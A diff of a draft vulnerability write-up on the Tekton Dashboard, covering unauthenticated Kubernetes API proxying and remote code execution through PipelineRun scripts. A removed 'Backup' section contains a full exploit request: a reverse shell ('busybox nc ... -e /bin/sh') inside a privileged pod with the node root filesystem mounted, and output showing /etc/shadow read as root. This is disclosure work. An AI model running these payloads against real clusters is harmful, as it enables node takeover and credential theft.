@@ -6,10 +6,11 @@ draft = true
 
 This is the story of how I found two vulnerabilities in the [Tekton Dashboard](https://github.com/tektoncd/dashboard) that allow remote code execution and a potential node takeover if deployed in `read/write` mode as well as pre-authenticated access to the Kubernetes API server in all modes.
 
-Both vulnerabilities were treated as intended and are thus still possible. Only the documentation was changed and the  default mode is now `read-only` instead of `read/write`
+Both vulnerabilities were treated as intended and are thus still exploitable. The documentation was changed and the default mode is now `read-only` instead of `read/write`.
+
+
 
 It started when I stumbled upon an unusual finding during an assessment. [Nuclei](https://docs.projectdiscovery.io/introduction) reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn't been observed in our client's scope before, prompting me to investigate further.
-
 
 ### Kubelet
 The [kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) is a binary running on every node thats part of a Kubernetes cluster. It interacts with the container runtime to create the actual containers. These are either based on pods requested by the Kubernetes API or the control plane components themselves, implemented as [static containers](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). 
@@ -79,7 +80,7 @@ Using the pre-authenticated proxying behavior it is indeed possible to view indi
 This artificial example contained a hard-coded secret value, obviously not recommended but nonetheless it happens. The same [mysql image](https://hub.docker.com/_/mysql) used in this scenario could also be started with the `MYSQL_RANDOM_ROOT_PASSWORD` environment variable set. This generates a random password and prints it to stdout, where it is still publicy accessible:
 
 ```
-└─$ curl -s http://tekton-dashboard:9097/api/v1/namespaces/default/pods/db/log 
+$ curl -s http://tekton-dashboard:9097/api/v1/namespaces/default/pods/db/log 
 ...
 2024-09-07 12:10:11+00:00 [Note] [Entrypoint]: Temporary server started.
 '/var/lib/mysql/mysql.sock' -> '/var/run/mysqld/mysqld.sock'
@@ -90,7 +91,7 @@ This artificial example contained a hard-coded secret value, obviously not recom
 At this point, I had gained access to several credentials and informed the client accordingly.
 
 
-To see what else we can do with that endpoint lets take a look at the [source code](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go). Initially, [client-go´s](https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme) `InClusterConfig()` is used to get a `config` containing the authentication details of the service account.
+To see what else we can do with that endpoint lets take a look at the [source code](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go). Initially, [client-go's](https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme) `InClusterConfig()` is used to get a `config` containing the authentication details of the service account.
 ```go
 func main() {
 ...
@@ -170,7 +171,7 @@ func (s *Server) ServeOnListener(l net.Listener) error {
 	return server.Serve(l)
 }
 ```
-By applying `CSRF()` to the original `http.Handler` inside `router.Server`, a new `csrf` struct is returned which implements the `Handler` interface to wrap `ServeHTTP()`. This will in turn be called by `http.Server.Serve(l)`. Then, for http methods deemed unsafe, a hard-coded HTTP header with the name `Tekton-Client` is expected:
+By applying `CSRF()` to the original `http.Handler` inside `router.Server`, a new `csrf` struct is returned which implements the `Handler` interface to wrap `ServeHTTP()`. This will in turn be called by `http.Server.Serve(l)`. Then, for http methods deemed unsafe like `POST`, a hard-coded HTTP header with the name `Tekton-Client` is expected:
 ```go
 func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if _, ok := safeMethods[r.Method]; !ok {
@@ -185,7 +186,7 @@ func (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
-The value of said header does apparently not matter, we can just set it for all requests to be sure. Other than that there were no restrictions.
+The value of said header does apparently not matter. To be sure we can just set it for all requests regardless of the HTTP method being used. Other than that there were no restrictions.
 
 **To summarize, if someone adhered to best practices and restricted network access to the Kubernetes API server but has a Tekton dashboard exposed to the internet, we can use its proxy to gain almost unrestricted access to the API server again. Additionally we can either bring our "own" credentials or act with whatever privileges the `tekton-dashboard` service account has.**
 
@@ -196,9 +197,11 @@ Or use credentials obtained in another way, for example, service account tokens 
 ![](shell.png)
 
 ### RCE
+  
+Initially, when I visited the root URL I noticed the following import function:  
 
-Initially, when I visited the root url I noticed the following import function:
 ![](import1.png)  
+
 ![](import2.png)  
   
 If we click through and fill in some dummy data we can generate the following request:
@@ -211,9 +214,9 @@ Tekton-Client: tektoncd/dashboard
 ...
 ```
 
-This request probably creates a PipelineRun resource so lets find out what that means.
+Judging by its request line, this request likely creates a PipelineRun resource so let's explore what that could mean.
 
-Because the path starts with `/apis/` we know we are dealing with a [named api group](https://kubernetes.io/docs/reference/using-api/#api-groups). As `tekton.dev` ist not a built-in group we are dealing with either an aggregated api server or, more commonly a custom resource definition (CRD). We can find the CRD in the pipelines repo:
+Because the path starts with `/apis/` we know we are dealing with a [named API group](https://kubernetes.io/docs/reference/using-api/#api-groups). As `tekton.dev` ist not a built-in group we are dealing with either an [aggregated API server](https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/apiserver-aggregation/) or, more commonly a [custom resource definition (CRD)](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/). We can find the CRD in the [pipeline repo](https://github.com/tektoncd/pipeline/blob/main/config/300-crds/300-pipelinerun.yaml):
 
 ```yaml
 apiVersion: apiextensions.k8s.io/v1
@@ -237,23 +240,57 @@ spec:
         type: object
 ...
 ```
-The schema is however not that expressive as it only expects a json object. We did however find a document describing the relation at `docs/developers/controller-logic.md`
+Custom resource creation requests are validated according to the OpenAPI v3 schema included in their definition. In this case however it does not provide further insights as it only expects a valid JSON object. Luckily, the repository contained some [documentation](https://github.com/tektoncd/pipeline/blob/main/docs/developers/controller-logic.md) indicating that every CRD has a matching go struct at `pkg/apis/pipeline/v1/`:
 
-`pkg/apis/pipeline/v1/pipelinerun_types.go`
-`pkg/apis/pipeline/v1/taskrun_types.go`
+```go https://github.com/tektoncd/pipeline/blob/main/pkg/apis/pipeline/v1/pipelinerun_types.go
+...
+// PipelineRunSpec defines the desired state of PipelineRun
+type PipelineRunSpec struct {
+	// +optional
+	PipelineRef *PipelineRef `json:"pipelineRef,omitempty"`
+	// Specifying PipelineSpec can be disabled by setting
+	// `disable-inline-spec` feature flag..
+	// +optional
+	PipelineSpec *PipelineSpec `json:"pipelineSpec,omitempty"`
+	// Params is a list of parameter names and values.
+	// +listType=atomic
+	Params Params `json:"params,omitempty"`
 
-matching reconcilers to create anything:
-`pkg/reconciler/pipelinerun/pipelinerun.go`
+	// Used for cancelling a pipelinerun (and maybe more later on)
+	// +optional
+	Status PipelineRunSpecStatus `json:"status,omitempty"`
+	// Time after which the Pipeline times out.
+	// Currently three keys are accepted in the map
+	// pipeline, tasks and finally
+	// with Timeouts.pipeline >= Timeouts.tasks + Timeouts.finally
+	// +optional
+	Timeouts *TimeoutFields `json:"timeouts,omitempty"`
 
-`pkg/reconciler/taskrun/taskrun.go#createPod()` is where the pod is created
+	// TaskRunTemplate represent template of taskrun
+	// +optional
+	TaskRunTemplate PipelineTaskRunTemplate `json:"taskRunTemplate,omitempty"`
 
-At this point things got complicated and I decided to play around with the functionality first.
+	// Workspaces holds a set of workspace bindings that must match names
+	// with those declared in the pipeline.
+	// +optional
+	// +listType=atomic
+	Workspaces []WorkspaceBinding `json:"workspaces,omitempty"`
+	// TaskRunSpecs holds a set of runtime specs
+	// +optional
+	// +listType=atomic
+	TaskRunSpecs []PipelineTaskRunSpec `json:"taskRunSpecs,omitempty"`
+}
+...
+```
+A [controller](https://kubernetes.io/docs/concepts/architecture/controller/) in Kubernetes monitors resources it is interested in and it "reconciles" in response to relevant events. That means it changes the clusters state to match the desired state. In this example that could mean creating a specific pod whenever a new PipelineRun is requested. Another controller, the kube-scheduler, notices the requirement of a new pod and goes on to schedule it to a node.
 
-At this point I noticed the "Edit an run" button of my existing PipelineRun which presented an editable yaml file:
+Therefore, to understand the PipelineRun resource we have to check its reconciler implementation at `pkg/reconciler/pipelinerun/pipelinerun.go`.
+
+Before diving into the code I wanted to take a break and play around with the functionality first. While doing so I noticed the "Edit an run" button of my existing PipelineRun. It presented a nicely readable and editable yaml file containing the definition of my PipelineRun resource:
 
 ![](yamlEdit.png)
 
-The `script` key immediately spiked my interest and it was indeed possible to execute arbitrary commands so I went for a shell with:
+Obviously the `script` key spiked my interest and it was indeed possible to leverage it to execute arbitrary commands so I went for a shell with:
 
 ```yaml
 script: >
@@ -264,17 +301,13 @@ script: >
 
 RCE is nice but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the nodes filesystem?
 
-I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which led me to:
+I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which finally led me to:
 
 ```yaml
 apiVersion: tekton.dev/v1
 kind: PipelineRun
 metadata:
-  annotations: {}
   generateName: import-resources-1727367416567-2nr95-r-
-  labels:
-    dashboard.tekton.dev/import: 'true'
-    dashboard.tekton.dev/rerunOf: import-resources-1727367416567-2nr95-r-qxptt
   namespace: tekton-dashboard
 spec:
   pipelineSpec:
@@ -294,9 +327,15 @@ spec:
     serviceAccountName: default
 ```
 
-Now we can just mount the hosts filesystem with:
+Pretending this is just a pod we could mount the hosts filesystem with:
 ```yaml
-#...
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  generateName: import-resources-1727367416567-2nr95-r-
+  namespace: tekton-dashboard
+spec:
+  pipelineSpec:
     tasks:
       - name: fetch-repo
         taskSpec:
@@ -320,73 +359,12 @@ Now we can just mount the hosts filesystem with:
     serviceAccountName: default
 ```
 
+And indeed it was possible to access the nodes file system, which is usually enough to compromise the whole cluster:
 ![](rce.png)
 
-**play arround with that at home, run taskrun alone, also have log access to the controller any maybe show that**
-
------ 
-welche rechte nochmal? kann ich auch direkt einen taskrun anlegen und kein pipelinerun?
-```
-    resources:
-      - stepactions
-      - tasks
-      - taskruns
-      - pipelines
-      - pipelineruns
-      - customruns
-    verbs:
-      - create
-      - update
-      - delete
-      - patch
-```
-pipelinerun generates a taskrun
-
-Tekton is built using knative https://knative.dev/docs/
-
-the CRD itself does not do anything, it needs a controller that changes te clusters state. That process is called "reconciling". Therefore i am looking for implementations of a reconlicer 
-
-wording: "configure the aggregation layer, add an extension api server running in a pod"
-
-can i add api aggregation without restarting the cluster, without adding a cli flag?
-
-Not possible to destinguish CRDs from api aggregation solely by looking at the path. They look the same 
-
-default named groups: https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.31/#api-groups
-
-Api server design docs: https://github.com/kubernetes/design-proposals-archive/blob/main/api-machinery/api-group.md
-
-There are 2 kinds of paths:
-core group  `/api/v1/`
-named groups `/apis/` `/apis/$GROUP_NAME/$VERSION`
-https://kubernetes.io/docs/reference/using-api/#api-groups
-
-aggregated discovery ist mir neu: https://kubernetes.io/docs/concepts/overview/kubernetes-api/
-zeigt alle ressourcen auf einmal statt nur an den einzelnen endpunkten dann wie /apis/tekton.dev/ -> versions
-Geht nur über den header:
-`Accept: application/json;v=v2;g=apidiscovery.k8s.io;as=APIGroupDiscoveryList`
-Damit mal scannen, außerdem mit dem protobuf header scannen, evtl lassen sich dadurch kubelets finden die das normale nuclei template nicht findet. Vlt gibt es da auch lücken im routing und oder firewalls
-
-
-
-Interestingly this only works in the `tekton-dashboard` namespace. Both `tekton-pipelines` and `tekton-pipelines-resolvers` have [pod security standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) profile `Restricted` applied:
+Interestingly this is only possible in the `tekton-dashboard` namespace (and every other non-secured namespace). Both the `tekton-pipelines` and the `tekton-pipelines-resolvers` namespaces have the [pod security standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) profile `Restricted` applied:
 
 ![](podsecurity.png)
-
-was told that would not be possible
->The Tekton control plan as well as its workloads (tasks and pipelines) often run in Kubernetes clusters that are shared with other services. Tekton cannot control or be responsible for the cluster-level security posture. Instead it relies on standard Kubernetes mechanisms like ServiceAccounts and Pod security policies.
-In addition to that, it is a requirement of several CI systems to execute privileged Pod - typically for use cases like docker-in-docker for container builds, because of that Tekton cannot just blanket block privileged containers.
-
-
-
-
-
-### Summary
-With an internet exposed Tekton dashboard you can:
-- Proxy requests to your Kubernetes API
-- Without authentication, act with the permissions of of the service account
-- Read logs and configuration of all pods in the cluster
-- If the read/write mode is enabled, get remote code execution on cluster nodes.
 
 ### Timeline / How did tekton react? / Communication with Vendor
 - works as intended
@@ -394,301 +372,11 @@ With an internet exposed Tekton dashboard you can:
 - Github advisory assigned as low
 No changes for tekton pipelines in general?
 
-### Remediation / Recommendation
-- Do not expose your dashboard to the internet. If needed require prior authentication as described here (link)
-**do not forget to test if oauht proxy is actually secure**
+### Recommendation
+- Do not expose your dashboard to the internet. If needed require prior authentication as described [here](https://github.com/tektoncd/dashboard/blob/main/docs/install.md#access-control).
+- Deploy your dashboard in `read-only` mode.
+- Limit the privileges of the `tekton-dashboard` service account.
+- Configure pod security standards for the whole cluster.
 
-
-# To do:
-**The ai takes instructions from the text too**
-- better introduction/summary
-
-- To angry? ask on signal / ask david
-- to verbose / simple?
-- Was ist denn der logs-proxy?
-- Erfahrungsbericht reicht auch für Blogpost so wie das mit dem Azure bootstrap token. Evtl auch CW blog
-- links wirken etwas random
-- mention shodan query
-
-- NewUpgradeAwareHandler() --> struct but it implements the "serveHTTP" interface which makes it a legit http.handler
-- The same function used within kubernetes itself to power proxying for example for the kubectl port-forward command
-https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L918
-uses proxyStream() which uses NewUpgradeAwareHandler()
-- As mentioned in https://github.com/kubernetes/kubectl/issues/744#issuecomment-545757997 client-go does not send authentication for plaintext connections.
-
-**Lausige Ausrede!! die haben das in den anderen Namespaces**
-
-get version:
-```
-└─$ curl -s http://127.0.0.1:9097/v1/properties | jq
-{
-  "dashboardNamespace": "tekton-pipelines",
-  "dashboardVersion": "v0.50.0",
-  "externalLogsURL": "",
-  "pipelinesNamespace": "tekton-pipelines",
-  "pipelinesVersion": "v0.61.1",
-  "isReadOnly": true,
-  "streamLogs": true
-}
-```
-
-In den pipelines ist podsecurity angewendet auf restricted aber beim dashboard nicht ? Seit wann ist das so?
-see label
-```
-└─$ kubectl get ns tekton-pipelines -o yaml
-apiVersion: v1
-kind: Namespace
-metadata:
-  annotations:
-    kubectl.kubernetes.io/last-applied-configuration: |
-      {"apiVersion":"v1","kind":"Namespace","metadata":{"annotations":{},"labels":{"app.kubernetes.io/instance":"default","app.kubernetes.io/part-of":"tekton-pipelines","pod-security.kubernetes.io/enforce":"restricted"},"name":"tekton-pipelines"}}
-  creationTimestamp: "2024-05-22T09:55:32Z"
-  labels:
-    app.kubernetes.io/instance: default
-    app.kubernetes.io/part-of: tekton-pipelines
-    kubernetes.io/metadata.name: tekton-pipelines
-    pod-security.kubernetes.io/enforce: restricted
-  name: tekton-pipelines
-  resourceVersion: "425"
-  uid: 6f886eb0-f59f-4c3d-bfc0-6ab50c266b47
-spec:
-  finalizers:
-  - kubernetes
-status:
-  phase: Active
-                                                                                                                                                         
-┌──(user㉿Attack)-[~]
-└─$ kubectl get ns tekton-dashboard -o yaml
-apiVersion: v1
-kind: Namespace
-metadata:
-  annotations:
-    kubectl.kubernetes.io/last-applied-configuration: |
-      {"apiVersion":"v1","kind":"Namespace","metadata":{"annotations":{},"labels":{"app.kubernetes.io/instance":"default","app.kubernetes.io/part-of":"tekton-dashboard"},"name":"tekton-dashboard"}}
-  creationTimestamp: "2024-05-22T09:57:16Z"
-  labels:
-    app.kubernetes.io/instance: default
-    app.kubernetes.io/part-of: tekton-dashboard
-    kubernetes.io/metadata.name: tekton-dashboard
-  name: tekton-dashboard
-  resourceVersion: "887"
-  uid: af000a48-38d9-4c35-8940-2b31b74c57d6
-spec:
-  finalizers:
-  - kubernetes
-status:
-  phase: Active
-
-```
-
-# Backup
-
-└─$ nc -klnvp 8000                                                                                                                                 130 ⨯
-Listening on 0.0.0.0 8000
-Connection received on 192.168.49.2 42195
-id
-uid=0(root) gid=0(root) groups=0(root),10(wheel)
-cat /var/noderoot/etc/shadow
-root:*:19840:0:99999:7:::
-daemon:*:19840:0:99999:7:::
-bin:*:19840:0:99999:7:::
-sys:*:19840:0:99999:7:::
-sync:*:19840:0:99999:7:::
-games:*:19840:0:99999:7:::
-man:*:19840:0:99999:7:::
-lp:*:19840:0:99999:7:::
-mail:*:19840:0:99999:7:::
-
-
-```
-└─$ ./kubectl-patch auth whoami --server='http://tekton-dashboard:9097'
-ATTRIBUTE                                      VALUE
-Username                                       system:serviceaccount:tekton-pipelines:tekton-dashboard
-UID                                            157053df-210e-46cd-8932-7b898348e22e
-Groups                                         [system:serviceaccounts system:serviceaccounts:tekton-pipelines system:authenticated]
-Extra: authentication.kubernetes.io/pod-name   [tekton-dashboard-7dcdbc4f54-kqggl]
-Extra: authentication.kubernetes.io/pod-uid    [30265944-5df4-45f7-9f81-8e8a3cd1fa60]
-```
-The "Import resources" functionality creates a new attacker-controlled pipelinerun. The following request triggers said pipelinerun including a reverse shell with root privileges (actual node root privileges). Additionaly the nodes file system is mounted inside the pod at /var/noderoot
-
-For editing, the yaml version of the payload is more convenient. In the web dashboard visit PipelineRuns > Create > YAML Mode to create a new run:
-
-```
-POST /apis/tekton.dev/v1/namespaces/tekton-dashboard/pipelineruns/ HTTP/1.1
-Host: 127.0.0.1:9097
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Content-Type: application/json
-Tekton-Client: tektoncd/dashboard
-Content-Length: 983
-Connection: close
-
-{
-    "apiVersion": "tekton.dev/v1",
-    "kind": "PipelineRun",
-    "metadata": {
-        "annotations": {},
-        "generateName": "import-resources-1716387335999-",
-        "labels": {
-            "dashboard.tekton.dev/import": "true"
-        },
-        "namespace": "tekton-dashboard"
-    },
-    "spec": {
-        "pipelineSpec": {
-            "tasks": [
-                {
-                    "name": "fetch-repo",
-                    "taskSpec": {
-                        "metadata": {},
-                        "steps": [
-                            {
-                                "computeResources": {},
-                                "image": "busybox:latest",
-                                "name": "clone",
-                                "script": "#!/usr/bin/env sh\nbusybox nc 192.168.58.1 8000 -e /bin/sh\n",
-                                "volumeMounts": [
-                                    {
-                                        "name": "noderoot",
-                                        "mountPath": "/var/noderoot"
-                                    }
-                                ],
-                                "securityContext": {
-                                    "allowPrivilegeEscalation": true,
-                                    "privileged":true
-                                }
-                            }
-                        ],
-                        "workspaces": [
-                            {
-                                "name": "repo"
-                            }
-                        ]
-                    },
-                    "workspaces": [
-                        {
-                            "name": "repo",
-                            "workspace": "repo"
-                        }
-                    ]
-                }
-            ]
-        },
-        "taskRunTemplate": {
-            "podTemplate": {
-                "volumes": [
-                    {
-                        "name": "noderoot",
-                        "hostPath": {
-                            "path": "/"
-                        }
-                    }
-                ]
-            },
-            "serviceAccountName": "default"
-        },
-        "timeouts": {
-            "pipeline": "1h0m0s"
-        },
-        "workspaces": [
-            {
-                "name": "repo",
-                "volumeClaimTemplate": {
-                    "metadata": {
-                        "creationTimestamp": null
-                    },
-                    "spec": {
-                        "accessModes": [
-                            "ReadWriteOnce"
-                        ],
-                        "resources": {
-                            "requests": {
-                                "storage": "1Gi"
-                            }
-                        }
-                    },
-                    "status": {}
-                }
-            }
-        ]
-    }
-}
-```
-
-yaml version
-```yaml
-apiVersion: tekton.dev/v1
-kind: PipelineRun
-metadata:
-  annotations: {}
-  generateName: import-resources-1716387335999-
-  labels:
-    dashboard.tekton.dev/import: 'true'
-  namespace: tekton-dashboard
-spec:
-  pipelineSpec:
-    tasks:
-      - name: fetch-repo
-        taskSpec:
-          metadata: {}
-          steps:
-            - computeResources: {}
-              image: >-
-                busybox:latest
-              name: clone
-              script: >
-                #!/usr/bin/env sh
-
-                busybox nc 192.168.58.1 8000 -e /bin/sh
-              volumeMounts:
-                - name: noderoot
-                  mountPath: /var/noderoot
-              securityContext:
-                allowPrivilegeEscalation: true
-                privileged: true
-          workspaces:
-            - name: repo
-        workspaces:
-          - name: repo
-            workspace: repo
-  taskRunTemplate:
-    podTemplate:
-      volumes:
-        - name: noderoot
-          hostPath:
-            path: /
-    serviceAccountName: default
-  timeouts:
-    pipeline: 1h0m0s
-  workspaces:
-    - name: repo
-      volumeClaimTemplate:
-        metadata:
-          creationTimestamp: null
-        spec:
-          accessModes:
-            - ReadWriteOnce
-          resources:
-            requests:
-              storage: 1Gi
-        status: {}
-```
-
-```
-POST /apis/tekton.dev/v1/namespaces/tekton-dashboard/pipelineruns/ HTTP/1.1
-Host: 127.0.0.1:9097
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: application/json
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: http://127.0.0.1:9097/
-Content-Type: application/json
-Tekton-Client: tektoncd/dashboard
-Content-Length: 3864
-Origin: http://127.0.0.1:9097
-Connection: keep-alive
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-
-{"apiVersion":"tekton.dev/v1","kind":"PipelineRun","metadata":{"annotations":{},"generateName":"import-resources-1725898668250-","labels":{"dashboard.tekton.dev/import":"true","gitOrg":"test","gitRepo":"test","gitServer":"github.com"},"namespace":"tekton-dashboard"},"spec":{"params":[{"name":"method","value":"apply"},{"name":"path","value":""},{"name":"repositoryURL","value":"https://github.com/test/test.git"},{"name":"revision","value":""},{"name":"target-namespace","value":"default"}],"pipelineSpec":{"params":[{"default":"apply","description":"Which kubectl command to use to import the resources (apply / create)","name":"method","type":"string"},{"default":".","description":"The path from which resources are to be imported","name":"path","type":"string"},{"description":"The URL of the git repository from which resources are to be imported","name":"repositoryURL","type":"string"},{"default":"","description":"The git revision from which resources are to be imported","name":"revision","type":"string"},{"default":"tekton-pipelines","description":"The namespace in which to create the resources being imported","name":"target-namespace","type":"string"}],"tasks":[{"name":"fetch-repo","params":[{"name":"repositoryURL","value":"$(params.repositoryURL)"},{"name":"revision","value":"$(params.revision)"}],"taskSpec":{"metadata":{},"params":[{"description":"The URL of the git repository from which resources are to be imported","name":"repositoryURL","type":"string"},{"description":"The git revision to clone","name":"revision","type":"string"}],"spec":null,"steps":[{"computeResources":{},"env":[{"name":"PARAM_URL","value":"$(params.repositoryURL)"},{"name":"PARAM_REVISION","value":"$(params.revision)"},{"name":"WORKSPACE_PATH","value":"$(workspaces.repo.path)"}],"image":"ghcr.io/wolfi-dev/git:alpine@sha256:3a118879b998f146812c11630805863f8a769587460938cbcc1daca874d9b57c","name":"clone","script":"#!/usr/bin/env sh\nset -eu\ngit config --global init.defaultBranch main\ngit config --global --add safe.directory \"${WORKSPACE_PATH}\"\ncd \"${WORKSPACE_PATH}\"\ngit init\ngit remote add origin \"${PARAM_URL}\"\ngit fetch --depth=1 --recurse-submodules=yes origin \"${PARAM_REVISION}\"\ngit reset --hard FETCH_HEAD\ngit submodule update --init --recursive\n","securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}],"workspaces":[{"name":"repo"}]},"workspaces":[{"name":"repo","workspace":"repo"}]},{"name":"import-resources","params":[{"name":"path","value":"$(params.path)"},{"name":"target-namespace","value":"$(params.target-namespace)"},{"name":"method","value":"$(params.method)"}],"runAfter":["fetch-repo"],"taskSpec":{"metadata":{},"params":[{"description":"The path from which resources are to be imported","name":"path","type":"string"},{"description":"The namespace in which to create the resources being imported","name":"target-namespace","type":"string"},{"description":"Which kubectl command to use to import the resources (apply / create)","name":"method","type":"string"}],"spec":null,"steps":[{"args":["$(params.method)","-f","$(workspaces.repo.path)/$(params.path)","-n","$(params.target-namespace)"],"command":["kubectl"],"computeResources":{},"image":"docker.io/lachlanevenson/k8s-kubectl:latest","name":"import","securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}],"workspaces":[{"name":"repo"}]},"workspaces":[{"name":"repo","workspace":"repo"}]}]},"taskRunTemplate":{"podTemplate":{"securityContext":{"runAsGroup":65532,"runAsNonRoot":true,"runAsUser":65532,"seccompProfile":{"type":"RuntimeDefault"}}},"serviceAccountName":"default"},"timeouts":{"pipeline":"1h0m0s"},"workspaces":[{"name":"repo","volumeClaimTemplate":{"metadata":{"creationTimestamp":null},"spec":{"accessModes":["ReadWriteOnce"],"resources":{"requests":{"storage":"1Gi"}}},"status":{}}}]}}
-```
+### Conclusion
+do i need a summary?
